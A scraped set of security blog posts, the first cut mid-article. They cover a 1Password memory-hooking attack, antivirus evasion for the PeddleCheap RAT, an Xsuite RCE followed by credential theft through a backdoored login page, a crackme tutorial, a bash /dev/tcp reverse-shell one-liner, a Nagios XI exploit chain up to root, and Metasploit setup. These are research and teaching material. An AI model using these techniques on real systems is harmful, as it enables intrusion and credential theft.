Turns out, the only way to trigger ‘RtlRunEncodeUnicodeString’ and ‘RtlRunDecodeUnicodeString’ on the master password entry dialog is by typing a character into it — which is fine, with one problem; we locate the buffer after the character is inserted — which gives us an incomplete master password.
One way to overcome this, and the route we took, was to identify the code that overwrote the first character of our buffer and hook it, rejecting the attempted change.
This routine is in the message processing loop of a control in comctl32 that handles the edit control buffer management. The call to ‘memmove’ at offset 0x70191731 overwrites the edit control buffer with the typed character:
Now we finally have all the pieces we need to craft an exploit. The following steps will allow us to extract the master password:
To perform this, we create a DLL that will contain handler code for these hooks. The DLL is injected into 1Password 4. Once injected, the DLL sends a single character to the master password dialog, firing off the memmove/RtlRunEncodeUnicodeString/RtlRunDecodeUnicodeString that we can then intercept to perform our magic to recover the encoded master password and decode it. Most of the magic happens in the hooked ‘RtlRunEncodeUnicodeString’ function, DetourRtlRunEncodeUnicodeString, listed below:
Which leads us back to the final result of unlocking a locked instance of 1Password 4, any version, just by exploiting a faulty workflow in utilized Windows’ APIs which results in unlocking a locked password manager without any previous knowledge of the master password:
When we first dove into 1Password 4 internals, we were expecting to encounter many challenges and expected all secrets to be scrubbed from memory, which they are in PBKDF2 workflows and other areas the master password is used. Entries, similarly are scrubbed. However, an oversight in the way a Windows-managed edit control, set to be a masked password field, unraveled 1Password 4’s security, in that an adversary, that is able to execute code on a victims machine via malicious software and/or physical access, will be able to unlock a locked instance of 1Password4 without any prior knowledge of the master password or associated encoded memory buffer locations.
Adrian Bednarek, Senior Security Analyst at Independent Security Evaluators, a firm of security specialists that provide a wide range of services including custom security assessments and software development. ISE also runs IoT Village, which hosts talks by expert security researchers who dissect real-world exploits and hacking contests consisting of off-the-shelf IoT devices.
Twitter: @ISESecurity
Sign up to get our latest blogs.
Special thanks to: Paul Stabnow, co-creator of Thread Imager
Written by
","['About', 'Threat Feed', 'ISE Labs', 'Blockchain Security', 'Blog Archive', 'Security', 'Hacking', 'Ise Labs', 'Cybersecurity', 'Business']"
"Red Team Diary, Entry #1: Making NSA’s PeddleCheap RAT Invisible",https://medium.com/@d.bougioukas/red-team-diary-entry-1-making-nsas-peddlecheap-rat-invisible-f88ccbdc484d?source=tag_archive---------9-----------------------,"Hi there,
This is Dimitrios Bougioukas, Director of IT Security Training Services at eLearnSecurity.
With this post eLearnSecurity inaugurates a series of posts (diary entries) that will share both IT Security research endeavors and cutting-edge attacking or evasion techniques. We will do the same for blue-team topics, with a focus on cutting-edge detection methods and tactical analytics.
The reason behind launching these posts is to engage the community and start a discussion around the techniques presented. This way, valuable insights and hopefully the readers’ own techniques can be shared in the “Responses” section at the bottom of each article.
The first post will be about an A/V or EDR evasion technique that I came up with while developing eLearnSecurity’s Penetration Testing eXtreme course. This technique was applicable against a number of A/V and EDR solutions. We (responsibly) contacted all vendors. Some of them hardened their solution against this technique, the others didn’t.
Note: If you don’t like reading lengthy posts scroll down. You will find a narrated video showing the evasion technique in action and how you can replicate it.
At eLearnSecurity we very much like scenario-based explanations. Imagine the following scenario: We are in the post-exploitation phase of a red teaming engagement and we want some kind of stealthy persistence. Sticking to the userland may not do the trick, so let’s move to the kernel.
Kernel-level persistence has been around for a long time. Latest iterations include the packetredirect module of NSA’s RAT PeddleCheap and RedSails. Both essentially bypass the TCP/IP stack of the Windows OS to provide us with stealthy communications and persistence, by manually diverting and manipulating packets. To do so, a (signed) kernel-mode driver is involved.
PeddleCheap is flagged by the vast majority of A/Vs. That being said, we are still going forward with it. We just need to find an A/V or EDR evasion technique in the process… :/
Find below everything I tried until I came up with a technique to make PeddleCheap invisible to some A/V and EDR solutions.
First, I started with the basics. Inside local VMs that featured different A/Vs and EDR solutions, I tried dropping an executable that contained the PeddleCheap RAT and executing it.
As you can imagine, by the time the executable touched the disk, the A/V’s or EDR’s signature/pattern database was employed and an alert was triggered.
2. Semi-fileless method (drop XOR-ed version of PeddleCheap, de-XOR & execute in memory)
As any red teamer would have done, I then decided to start moving the execution into the endpoint’s memory. I did so using classic PE injection/process hollowing/dynamic forking. I actually once again dropped an executable that contained a XOR-enrypted PeddleCheap RAT alongside a decrypting function. Upon execution, this decrypting function will de-XOR PeddleCheap and execute it inside the endpoint’s memory and specifically in the same address space as the host process (created by the dropped executable). So, we are currently talking about a semi-fileless method.
Unfortunately I was once again busted (heuristically this time), since the latest A/V and EDR solutions have the ability of taking the .text section of a binary on disk and comparing it with the .text section of the same binary in memory. Due to the decrypting function we previously talked about, the two .text sections will be quite different. Latest A/V and EDR solutions can also detect changing the page permissions to PAGE_EXECUTE_READWRITE (which is necessary during PE injection) and even perform brute-force attacks against XOR encryption implementations.
3. Fileless method (introduce a RAMDisk, drop original PeddleCheap & execute)
APT groups and advanced hacking teams are known for using obscure exploitation methods. This is the road I decided to take as well. I remembered a very interesting technology called RAMDisk. RAMDisks essentially take a portion of an endpoint’s physical RAM and introduce it as a disk to the OS.
When it comes to RAMDisks no PCIe is ever involved. Every disk operation is an affair between the CPU and the endpoint’s memory only.
I thought that anything dropped on a RAMDisk will reside and be executed in memory (fileless method). So I introduced a RAMDisk and dropped an executable containing PeddleCheap (the original one, not XOR-encrypted) on several of my local testing VMs. No alert was triggered and my hopes got high! Then i tried to execute it…
To my surprise, I was once again caught by A/V or EDR solutions.
Quite frustrated, I was banging my head to identify how I was getting caught. This is when I remembered that everything on Windows, the file structures, the directory structures, etc., are all provided to applications through file system drivers. In addition to that, while applications are loaded, DLL files and EXE files are read again through those file system drivers. Over-simplifying things, what A/V or EDR vendors usually do is place some filter drivers on top of those file system drivers to gain (real-time) visibility on what is being loaded. Regardless of a real disk or a RAMDisk being used, those file system drivers are still being involved. So, by the time I tried to execute the executable containing PeddleCheap inside the RAMDisk, the A/V or EDR saw it “passing”, compared it against its pattern/signature database and prevented execution.
4. Fileless method (introduce a RAMDisk, drop original PeddleCheap, drop custom PE loader & execute)
Before calling it a day, I decided to give this a final try. As mentioned, earlier the OS PE-loading mechanics were getting in the way. So, this time I introduced a RAMDisk in my local VMs, dropped an executable containing PeddleCheap but also dropped a custom PE loader to circumvent* the OS’s PE-loading procedure. Up to this point no alert was triggered and everything resided in memory (inside the RAMDisk).
Finally, I provided the executable containing PeddleCheap as an argument to the custom PE loader, and to my surprise some A/V and EDR solutions showed no alert! Back to my attacking machine, a session has been established, PeddleCheap was injected and executed in memory as planned.
*Note that the custom PE loader itself does not circumvent the normal OS PE-loading procedure but that’s OK since it is a benign piece of software, it simply takes another executable as an argument and executes it in memory.
For technical details regarding each attempt and to see the covered evasion technique in action, please view the narrated video below.
The above technique (and every technique that includes a kernel-mode driver actually) could have been detected as follows.
2. Monitor the SHA1 checksum of c:\Windows\System32\Drivers directory.
The covered technique could also be detected by regularly checking for the existence of a new drive or through memory forensics (remember the PAGE_EXECUTE_READWRITE permissions we talked about earlier, PeddleCheap uses similar tradecraft).
No doubt there are way better and stealthier A/V and EDR evasion techniques. This post simply highlights how evasion can be achieved by misusing existing technology (and thinking outside the box).
This technique has been presented during Security BSides Athens. Find the slide deck in the link below.
https://drive.google.com/file/d/1xBwMuF62eYKv3A2TNRgKNVE_nAViSrVZ/view?usp=sharing
Written by
","['Cybersecurity', 'Hacking', 'Infosec', 'Information Security', 'Security']"
Regarding Marcus Hutchins aka MalwareTech - DoublePulsar,https://doublepulsar.com/regarding-marcus-hutchins-aka-malwaretech-650c99e96594?source=tag_archive---------3-----------------------,"For the last few weeks Marcus Hutchins has been in Las Vegas attending a security conference, and on holiday. On Wednesday he was arrested on the flight home due to an indictment made in the US state of Wisconsin back in early July. He has now been granted bail for Monday, assuming bond is posted.
The allegations are around him allegedly selling malicious software for $2,000 in digital currency in June 2015. The case seems to stem from the takedown of a website called AlphaBay, where a large amount of new cases are now entering the US justice system.
Marcus is a leading voice in the UK cybersecurity scene, and indeed worked with the UK Government’s National Cyber Security Center on stopping WannaCry and analysing other malicious software:
He is an incredibly valuable asset to the UK. He isn’t just a voice — his work has an been invaluable to the UK for some time. He lives and breathes cyber security, almost 24/7, protecting people.
For the past few years there has not been a day gone by where I haven’t used or heard his research in my day to day cybersecurity work. This is going to create a huge hole for everybody, in particular the UK.
On a personal level, Marcus is a good person who does not deserve how this has been handled by authorities.
When the indictment was first released, I had to Google “Kronos” to establish what it even was — I haven’t seen it in my 17 years in cyber security.
The first public post I can see for it is on 10th June 2014 in Russian:
Per a Forbes reporter: “…it was largely a failure amongst serious cybercriminals”.
MalwareTech’s business and job is around finding, reversing and analysing malicious software (malware) and finding the techniques used. This includes monitoring “dark web” websites, where covert identifies are used to gain access — as is common across the security industry.
His data around botnets is sold to organisations, including Law Enforcement, around the world.
Sometimes, his research is misused:
To help get to the truth, I strongly encourage:
I have been in a state of shock since I found out about the arrest. The allegations are essentially over $2,000 in digital currency, and could potentially incur up to 40 years in jail in the US. If MalwareTech is to be tried, he should be tried in his home, the UK. Every effort needs to be made to ensure this case is properly investigated.
On a personal note, I am withdrawing from dealing with the NCSC and sharing all threat intelligence data and new techniques until this situation is resolved. This includes through Cyber Security Information Sharing Partnership. Many of us in the cyber security community openly and privately share information about new methods of attacks to ensure the security for all, and I do not wish to place myself in danger.
Edit: Corrected the date of exploit.in forum post on Kronos to be June 10th.
Edit 06/08/2017: Corrected exploit.in link.
Written by
","['All Stories', 'Contact', 'here', 'Cybersecurity', 'Malwaretech']"
Remote Code Execution — Gaining Domain Admin due to a typo,https://medium.com/@DanielC7/remote-code-execution-gaining-domain-admin-privileges-due-to-a-typo-dbf8773df767?source=tag_archive---------1-----------------------,"Firstly, apologies for the click-bait title, I did refrain from creating a custom website and logo so I believe this is a fair compromise. :)
A short time ago as part of a red team engagement I found and successfully exploited a remote code execution vulnerability that resulted in us quickly gaining high privilege access to the customers internal network. So far nothing sounds too out of the ordinary, however interestingly the root cause of this vulnerability was due to a two character typo. The advisory can be found here.
Note: I realise this blog post would be much better if I included some additional screenshots, however I did not want to risk accidentally revealing information about our client.
After performing some basic enumeration I found a subdomain belonging to the target organisation which proudly stated “Powered by Xceedium Xsuite”. After a bit of googling I stumbled across an exploit-db article containing several vulnerabilities in Xsuite, including unauthenticated command injection, reflected cross-site scripting, arbitrary file read, and a local privilege escalation vulnerability. Easy, right?
Unfortunately, due to the targets configuration the command injection vulnerability did not work, the privilege escalation requires prior access to the device, and where possible I wanted to avoid user interaction (so cross-site scripting is a no-no). This left us with the arbitrary file read:
Naturally, the only ports that could be accessed over the internet were 80 & 443. Despite being able to read various hashes from the /etc/passwd file, they were useless to us:
At this point I believed the best way forward was to find the hosts document_root, and to start downloading source code. I could then manually audit the code with the intention of finding additional vulnerabilities in Xceedium Xsuite. After reading numerous Apache configuration files the document_root was found:
So far we only know the location of two pages:
The source code for both of these files was downloaded using the arbitrary file read and reviewed to find references to any other PHP or configuration files. These were also downloaded. Whilst this process could have been scripted, it was decided that since I would be auditing the code, I may as well manually retrieve the source code during the auditing process (This also has the added benefit of limiting requests to the target host).
After a day of manually downloading and auditing PHP I believed I had a good enough understanding of how the application works and had found a few bugs/interesting functions. In addition to the RCE outlined in this post, other vulnerabilities were found along the way such as an additional arbitrary file read and various SQL injection issues. As I could already read local files & no database appeared to be configured, these were useless. My only interest at this point was RCE.
The road to code executionOne of the interesting functions I had highlighted was linkDB() which reads the contents of /var/uag/config/failover.cfg line by line and passes it to the eval() function. This means that if we somehow find a method to write PHP code to failover.cfg, we may then be able to call the linkDB()function to execute remote code on the host. Interesting, but we currently have no control over failover.cfg or its contents.
After a while I located the functionality that populates /var/uag/config/failover.cfg (This code has been modified slightly to avoid including numerous lines of string parsing!).
To summarise: We now know the contents of failover.cfg are passed to eval(), which may lead to code execution. We know the putConfigs() function takes a parameter, passes it to base64_decode(), passes it to unserialize() (again, let’s just pretend you never saw this!) and then saves it to failover.cfg Now we need to see where the $post variable that is used in putConfigs() originates from and if we have any control over it.
So the $get parameter being passed to putConfigs() originates from a parameter being passed to the activeActiveCmdExec() function.
So activeActiveCmdExec() takes direct user input. This means we can directly control the input to activeActiveCmdExec(), which is then passed to putConfigs(), base64_decode(), unserialize(), and finally saved into /var/uag/config/failover.cfg. We can now create a serialized, base64 encoded request that will be saved into failover.cfg, afterwards we can then invokelinkDB() which will pass the file containing our malicious code to eval() and we have achieved code execution… Or so I thought.
As we will be overwriting a configuration file, one mistake and we may brick the device and have a rather unhappy customer on our hands. Even if we don’t brick the device, we may only get one chance at writing to the config file. Because of this I decided to err on the side of caution and took the relevant parts of code and test our exploit locally. After a few attempts I was getting the message “BAD SHARED KEY”. Unfortunately I had overlooked something at the beginning of the activeActiveCmdExec() function:
The function checks a valid shared key is passed via the $get variable. Without a legitimate key we cannot reach the functionality necessary to write our code to the failover.cfg file, we cannot invokelinkDB() to evaluate our code, and we cannot execute code on the remote host…
At this point I believed it may be time to go back to the drawing board and find a new method to attack the host (unsanitised user input being passed to unserialize() perhaps?). Fortunately as I have the ability to read local files, the shared key may be hard coded in the source code or saved in a readable config file. We can then include the key in our request, and pass this check. So let’s check the checkSharedKey() function to see where this shared key is saved.
This function does the following:1) Check the key passed to it is 32 characters in length;2) Check the key passed to it isn’t an empty string;3) Read the failover.cfg file line by line;4) Check the provided shared key matches the shared key in failover.cfg.
So we can use our arbitrary file read to extract the shared key from the /var/uag/config/failover.cfg file, append it to our request, write our serialised, base64’d PHP code to failover.cfg, invoke linkDB() to eval() our malicious code, and execute code on the remote host. After reading the contents of failover.cfg I was greeted with the following:
The file is empty.
We cannot steal the existing key to pass the authentication checks as there isn’t one configured. After again failing I turned my attention back to the checkSharedKey() functionality. The first thing the checkSharedKey() function does is check the provided key is 32 characters long. This means we cannot simply pass a blank key to pass the check. Once again it may be game over. However, after a while I noticed a subtle issue that I had previously overlooked. Did you see it?
Due to a typographic error, when a shared key is provided that is 32 characters in length, but empty after a call to trim(), the function will return “flase”. This will return the literal string “flase” instead of the Boolean value FALSE. Fortunately for us, the string “flase” has a Boolean value of TRUE, thus the key check will be successful and we can bypass the authorisation check.
Reviewing PHP’s trim() manual we find the following:
So in theory we can use 32 spaces, tabs, line feeds, carriage returns, null bytes, or vertical tabs to reach the necessary code paths required to execute code. All because somebody typed two characters the wrong way around in the word “false”!
To test our theory we can take the relevant parts of code, and write a small script that utilises the same logic as the Xsuite code.
I then tested a few inputs to see what happened:
As expected, passing a 32 character random string returns the Boolean value of FALSE and we do not bypass the checks. Now to try our theory of carriage returns/null bytes/etc:
As predicted, a string composed of 32 carriage returns, null bytes, etc will bypass the checkSharedKey() functionality. We can now bypass the authorisation checks to reach our desired code paths. As there are a lot of steps to this exploit and a significant number of things that may go wrong, it was decided that we should once again test the exploit locally with the relevant code.
Exploitation
After a while testing locally, the following exploitation steps had been refined:
Decoding the contest of the post parameter gives the following serialized payload:
which corresponds to a PHP object of the form:
2. Verify the config file has been successfully poisoned by reading it back using the arbitrary file read vulnerability in read_sessionlog.php:
3. Invoke linkDB() to eval() the contents of failover.cfg and execute a command.
Conclusion
Upon first discovering the Xceedium device, it appeared we had struck gold. A significantly outdated device with publicly available exploits resulting in RCE. Naturally this was not the case and successful compromise took significantly more time and effort than originally expected.
For those of you who are curious how the rest of the engagement went. Upon compromising the device we quickly discovered a method to gain root access to the device. Due to the nature of Xceedium Xsuite (Identity and Access Management), hundreds of users were authenticating to the device every day. With root access we simply backdoored login.php to steal hundreds of domain credentials. Fortunately for us some of the clear-text credentials we captured were domain/enterprise administrators. This allowed us complete access to various domains across the globe. Obviously the goal of red teaming isn’t to gain domain administrator, but it certainly helps. :)
As previously mentioned, I’m sorry that there aren’t more screenshots showing the actual attack, however I don’t want to risk outing the client. Additionally, at the time of discovery I had no intentions of releasing this bug publicly. Finally I wish I could say Xceedium (Now CA Technologies) were a treat to work with during the disclosure process however that would be a lie.
Written by
","['Security', 'PHP', 'Cybersecurity', 'Infosec', 'Hacking']"
Reverse Engineering With Radare2 — Part 2 - Jacob Pimental - Medium,https://medium.com/@jacob16682/reverse-engineering-with-radare2-part-2-83b71df7ffe4?source=tag_archive---------4-----------------------,"This article is a continuation of my first article “Reverse Engineering Using Radare2” where I gave a basic introduction to the tool. I highly suggest starting there if you haven’t already, as it covers the very basics.
This article will demonstrate some of the other interesting features of Radare2 by walking you through how to solve a simple Capture the Flag style program. You can download this program on my gitHub (the crackme binary). If you go ahead and run this program you’ll see that it requires us to input a password.
If we try to give it a password that we know is wrong, we’ll see that we get a message denoting our failure.
There are multiple ways we can approach this problem. We can attempt to bruteforce the password, sending the program a bunch of different letter combinations until we eventually figure out the password. The standard password length is around 8 characters. We can safely assume that the password is comprised of upper and lowercase letters, and maybe even numbers. According to this calculator, then it would take us about 15 years to bruteforce the password. I don’t have that long to wait, so we’re going to use Radare2 to crack the password.
Just like in the last tutorial we start by using rabin2 to get some basic information about the program. Let’s run it with the -I flag and see what we’re dealing with.
Just like last time it looks like we have an x64 Linux Binary that was written in C. This information is interesting, but doesn’t really help us figure out what the password is. Maybe the strings in the binary will give us a clue. We can view them using rabin2. Normally we use the normal -z flag, but that shows a lot of output. We can use the -zqq flag to show just the strings.
We can see a lot of interesting things here! We see the message that says “You failed”, which we got when we got the password wrong. We can also see the string “Congratulations”, which we can assume we get when we get the password right. We also see the string “radare2”. We can assume that that may be the password. We may be wrong but it never hurts to check.
Great! We got the password! Sometimes it isn’t this easy, the password string could be obfuscated or encrypted. We would have to reverse the encryption in a case like that, but we seem to be lucky this time. It looks like we need to input another password to solve this challenge. I didn’t see anything else that looks like a password when we checked the strings, so we’re going to have to dig deeper than that. Let’s load up the binary in radare2 and analyze it using “aaa”. This analyzes all of the functions the program may have.
We should also seek to the main function, as that is where the program starts.
Now that we’re at the main function we’re going to switch into radare2’s graph mode. This will help us see how the program flows and see where the checks for these passwords are being done at. To go into graph mode use the command “VV”.
You should now be seeing radare2’s ascii graph. You can navigate the graph using HJKL keys like in Vim, or the arrow keys. If you take a look at the first block in the graph you can see the check for our first password.
You can see in the last few lines that it is taking the string “radare2” and comparing it to the users input using the function strcmp. Then it checks to see if the strings are equal or not. If they are not equal then we follow that green T line (which stands for true) down to these blocks of code:
We can see in the top block that the program is comparing some variable to zero. If it is not equal to zero then it prints out the statement “Flag is: r2{%s %s %s}”. This must be our flag for completing the challenge. Unfortunately it uses format strings to format what is in the flag, so we don’t know what the flag is just by looking at the string. If that variable in the first block is equal to zero then it prints out the “You failed” message. So we can gather from this that some variable that dictates whether or not we get the flag is changed once we get all the passwords correct. Let’s go up to the top and see what happens if we get that first password correct.
So it prints out the “Congratulations” string and then prints “What’s the second password?”. It then grabs our input using scanf and runs that through the function atoi. The atoi function is used to convert a string into an integer. So the second password must be a number! We can see that it is comparing the output of atoi to the value 0xf. Now, if you don’t know hexadecimal offhand then radare2 has yet another great tool for you! Open a new terminal and use the command “rax2” to convert the value 0xf into an integer.
So the second password is 15! Let’s try that and see if it works.
It looks like it requires us to put in a third password. Let’s move down to the next block of code in radare2 and see what we need to do.
This looks very similar to the last password check it did. We can see that it asks for the third password, runs the user’s input through atoi and compares that to the hex value 0x539. If we run that through rax2 we find that the decimal equivalent of that is 1337. So we plug that in as the last password and we get:
Great! It gave us our flag! If this was an actual Capture the Flag then we could plug this in somewhere for points.
We managed to get the passwords without having to run the program multiple times and without having to guess the password at all. By reverse engineering the application it was like the program was just handing us the information we needed. Reverse engineering is a very handy tool to have in any setting as you can use it to find out everything an application is doing. I hope this introduction to radare2 was helpful to those wanting to get started in the field. You can follow me on Twitter or LinkedIn if you need any more help or guidance!
If you like this article you can view more on my updated blog at https://goggleheadedhacker.com/1
Thanks for reading and happy reversing!
Written by
","['Programming', 'Radare2', 'Reverse Engineering', 'Hacking', 'Cybersecurity']"
Reverse shell !?! - HackerNoon.com - Medium,https://medium.com/hackernoon/reverse-shell-cf154dfee6bd?source=tag_archive---------2-----------------------,"Whats a reverse shell? It’s that turtle that you jump on and it bounces off a wall and comes back at you right?
Not quite but, you aren’t alone in ignorance. It is surprising that the number of folks that don’t actually know what a reverse shell is. Long story short, it is when one computer connects to another computer but the initiating computer forwards their shell to the destination. It is commonplace that a reverse shell happens during an attack or as part of a pentest. They are scary attacks because it gives an attacker an interactive shell on a machine that they should not have had access to inside of the “hardened” area.
Lets break down how this works. First there is a machine listening somewhere on a specific tcp port. In this case using netcat.
Simple enough, just a listener on a specific port. Second, we will need another machine, the victim, to connect to this machine and then forward the session to it. There are countless ways to setup this connection depending what resources are available. This is how to do it with bash
The command bash -i >& invokes bash with an “interactive” option. Then /dev/tcp/192.168.1.142/7023 redirects that session to a tcp socket via device file. Finally 0>&1 Takes standard output, and connects it to standard input.
It turns out linux has built a /dev/tcp device file. While powerful and useful this file can be extremely dangerous when used in this way. This built in device file lets bash connect directly to any ip and any port out there. This also works well if you want to confirm a port is open, or check the time.
What’s so scary about this? Well, netcat can be listening on any port, and in the example it listened on port 80. This means that the connection and all the traffic flowing through that pipe is going to look like regular http traffic and if that port is open on one of your hosts (as it usually is) then it doesn’t matter what kind of firewall you have, it isn’t going to stop a reverse shell from owning you. Subsequently it doesn’t stop a machine from inside your firewall that has access to the internet **cough**cough laptops, from using the allowable port, and then pivoting to anything that can be accessible on the internal lan.
Reverse shells are really fun to play with especially if you have something like a rubber ducky or a bash bunny. That lets you walk up to an unsecured laptop (that you have legitimate access to of course) and snag a shell. Then wait for your victim to come back and…
Finally, here are examples of allowing a shell through in a whole bunch of different languages, because well not everything has bash, just most of the things.
Written by
","['About', 'Help', 'Go Home', 'Linux', 'Hacking', 'Security', 'DevOps', 'Cybersecurity']"
Rooting Nagios Via Outdated Libraries - Tenable TechBlog - Medium,https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172?source=tag_archive---------9-----------------------,"For around six years Nagios XI could be remotely rooted by an unauthenticated attacker. Nagios XI included an outdated library, MagpieRSS (and therefore, Snoopy). The inclusion of this library created an unauthenticated remote code execution (RCE) vector (CVE-2018–15708) until Nagios patched it in late 2018. A separate vulnerability in Nagios XI, CVE-2018–15710, allowed for local privilege escalation (LPE). These vulnerabilities can be combined to gain a root shell on a Nagios XI 5.5.6 instance.
Nagios claims to have over 9,000 customers, including companies such as Cisco and PayPal. A search on Shodan.io for “Nagios” yields over 4,000 results.
The RCE vulnerability mentioned above merely gains privileges as the ‘apache’ user. Fortunately (or unfortunately, depending on how you look at it), there have been ways to escalate privileges to root on Nagios XI since version 2012r1.0. Interestingly enough, the LPE vulnerability in version 2012r1.0 is different from the LPE found in 5.5.6.
Nagios XI includes a vulnerable component. The code execution vulnerability can be triggered by sending a crafted request to magpie_debug.php. Let’s walk through the code to show how this works. I have added comments to point out the lines of interest. Also, for the sake of brevity, some lines have been removed from the snippets. These lines are denoted by an inline comment of “snip” (e.g. // snip).
Below is magpie_debug.php. This script can be accessed in a web browser without authentication. Notice that the HTTP GET ‘url’ parameter is passed to the fetch_rss() function without prior validation or sanitization.
The fetch_rss() function is defined in rss_fetch.inc. The function accepts a ‘url’ parameter, and if the cache is disabled, the URL is passed to _fetch_remote_file(). Again, this is performed without prior validation. This pattern will become familiar as we step further into the code.
Also defined in rss_fetch.inc is the _fetch_remote_file() function. In this function, a Snoopy object is created, and the raw URL is passed to the Snoopy fetch() method.
Now we are looking at code in the Snoopy library. The fetch() method will perform an HTTP GET request (by default) against a given URI. As it relates to the vulnerability, when a URI specifies an HTTPS scheme, the _httpsrequest() method will be called. The URI is passed as the second argument, regardless of whether a proxy is used or not.
Finally, we reach the _httpsrequest() method. I only show the call to exec() in this method, though the method definition is much longer. Additionally, I have modified the formatting of the exec call to use multiple lines, so the full invocation is viewable in this snippet.
Anyway, the first argument to exec() is the command string. In this call, the command string is generated by concatenating the path to the curl binary, some parameters, and the URI itself. Notice that the cmdline_params and URI variables are passed to the escapeshellcmd() function prior to concatenation. Sadly, the function is being used incorrectly.
As stated in the PHP documentation, “escapeshellcmd() should be used on the whole command string, and it still allows the attacker to pass an arbitrary number of arguments. For escaping a single argument escapeshellarg() should be used instead.” The proper function to use is escapeshellarg().
Due to this error, arbitrary arguments may be injected into the curl command.
Curl has an option (-o) which enables the user to write the HTTP response to a file instead of standard output:
Let’s recap on what we know:
With this information, the following strategy can be used to execute arbitrary PHP code:
To find a suitable directory, I ran this command:
This command searches for directories in /usr/local/ that are owned by the apache user. Fortunately, many directories were returned, and the /usr/local/nagvis/share/ directory is publicly accessible. I searched in /usr/local/ because Nagios XI is hosted here.
Note: The directory differs between versions 2012r1.0 and 5.5.6.
I won’t show you how to create an HTTPS listener (must be HTTPS), but you can view it in the full exploit code online. Our listener will respond with the following:
Assume the Nagios XI instance is located at https://192.168.1.208, and our listener is at https://192.168.1.191:8080. Using the following URL, we can write the PHP code to /usr/local/nagvis/share/exec.php. Notice that “-o /usr/local/nagvis/share/exec.php” is included in the value of the ‘url’ parameter. This tells curl to output the response to this file.
Once this request is completed, the attacker can execute arbitrary system commands by requesting a URL like this:
However, the ‘whoami’ command returns ‘apache’. Let’s take a look at how to escalate privileges to root.
There are two reasons why privilege escalation is possible in version 5.5.6:
Interestingly enough, the same /etc/sudoers configuration is in place in version 2012r1.0, but code execution is gained with a different binary (nmap).
Let’s take a look at 5.5.6 first.
While enumerating the operating system inside an SSH session, I found some intriguing entries in the /etc/sudoers file:
These entries enable the ‘nagios’ and ‘apache’ users to execute the ‘autodiscover_new.php’ script with ‘sudo’, and arbitrary arguments can be supplied. No password will be prompted for. Essentially, this entry makes the PHP file as juicy as a root-owned executable with the SUID bit set.
The only question is, how can code be executed with this script?
Ever heard of SourceGuardian? I hadn’t. And I won’t forget it. It’s a protection mechanism that compiles PHP source code and then encrypts it. For the security researcher, this makes life a bit more difficult. Instead of simply being able to read the PHP source of autodiscover_new.php, the source looks like this (though this is only a snippet):
Notice the call to sg_load() and its argument. The actual string argument to be loaded is much longer. This string is loaded by SourceGuardian to decrypt and execute the compiled byte code.
Fortunately we can still perform dynamic analysis on the script to try and figure out how it works. I first tried to launch the script with the ‘ — help’ flag to see if a help prompt would show.
As you can see, this yielded some results. Based on the output, it’s reasonable to assume that this script will discover devices on a network within a specified IP address range. My first thought was to try and scan localhost.
My next thought was to provide a CIDR with a prefix of 0 to see if it worked (127.0.0.1/0). I got the same result. Next, I tried a prefix of 1. The results were quite interesting.
Based on this output, it looks like the ‘fping’ executable is being launched with our CIDR being incorporated in the command. Immediately this evokes thoughts of the possibility for command injection. Before I got too trigger-happy, I decided to perform an ‘strace’ to watch what system calls take place during execution. Specifically, we are looking for a system call which launches fping (possibly an exec variant).
Basically, this command will perform a system call trace during the execution of autodiscover_new.php. Forks will be followed (-f), output will be limited to a length of 200 characters (-s 200) instead of 32 by default, and the results will be written to strace.txt.
I found a few lines in the output that verify the possibility of a command injection vulnerability:
Clearly, fping is being executed, and our input (“127.0.0.1/1"") is concatenated into the command. I’m leaving out some details here because there are loads of resources online about how to find a command injection vulnerability. It requires some trial and error. Trust me when I say, “there is a vulnerability.”
Let’s just see the privilege escalation exploit already!
Hold on for one moment. As of now, we know the following:
With this in mind, we can exploit the command injection while running the script with sudo to gain a root shell (with no password). Here is the exploit in action. Note that this example is performed by the ‘nagios’ user. The ‘apache’ user isn’t allowed to log into a shell. But remember, they have the same access rights in the /etc/sudoers file.
The privilege escalation technique is similar in the 2012r1.0 version of Nagios XI. Again, there is an entry in /etc/sudoers that enables the ‘apache’ user to execute a command without a password. However, it’s different in this version. Instead of autodiscover_new.php, the ‘nmap’ binary is specified.
But how do we execute shell commands with Nmap? There is a nifty feature of Nmap called the Nmap Scripting Engine (NSE) that allows users to write custom scripts that Nmap can execute. The NSE is based on Lua, so in order to execute shell commands with Nmap, we can write some basic Lua using the ‘os.execute’ function. Again, the test is performed by the ‘nagios’ user.
Let’s take a second to remember what we have accomplished:
If we put these two together, we can pop a root shell remotely. Again, we first have to exploit magpie_debug.php to give us PHP code execution. Once we have this, the privilege escalation can be leveraged. However, if we want a remote shell, we will need to alter the payload. I have utilized a common Bash one-liner to connect back to my listening Netcat instance.
Below is the Netcat listener:
Here is the URL to visit in order to fire off the connect-back. I’ve listed two URLs as they are different depending on the target version of Nagios XI.:
Once the reverse shell connects back, the following output is displayed in the Netcat session. We can interact with the shell as the root user.:
I’d like to point out that these vulnerabilities, while the most severe, were not the only bugs found in Nagios XI. For more information, check out the Tenable Research Advisory. Also, Nagios was a pleasure to work with during the disclosure process. Communications were timely, and a patch was issued very quickly. Take a look at their security issues page for remediation guidance.
Written by
","['Networking', 'Cybersecurity', 'Hacking', 'Reverse Engineering', 'Programming']"
Running Metasploit on Kali Linux Docker (AWS EC2 Instance),https://medium.com/@s.on/running-metasploit-on-kali-linux-docker-aws-ec2-instance-a2f7d7310b2b?source=tag_archive---------0-----------------------,"Once you managed to SSH PuTTy into the EC2 instance with the given private key (.ppk), you should see something like this:
You are now in control of a fully working Linux server running in the AWS cloud. Let’s install Docker on it.
Next, add the ec2-user to the docker group so you can execute Docker commands without using sudo. Note: You’ll have to log out and log back in for the settings to take effect:
If you did everything correctly, the last command, docker info, will return lots of information about your Docker install without any errors.
Next we can run commands to display the containers and images that we have. For now let’s focus on images by running the following command.
This returns us nothing at the moment, once we have images it will list them.
Next, we will be pulling the official Kali Linux Docker image. More info — https://hub.docker.com/r/kalilinux/kali-linux-docker/
The following command will pull the image of “Kali Linux” to a “Docker” container:
Once completed we can then run the image which will load the image into its container and then returns me a command prompt for the “Kali Linux” instance.
Now that we are in the Kali Linux instance (notice the prompt has changed), we will proceed to do an apt-get update/upgrade.
Due to the image being trimmed down, in order to install Metasploit you will need to apt-get it. This can be done using a standard “apt-get” command. Metasploit was removed from Kali (it’s in the Kali 2.0 release notes), they now support only metasploit-framework out of the box.
Once it has completed you are able to then run Metasploit using the standard command and voila!
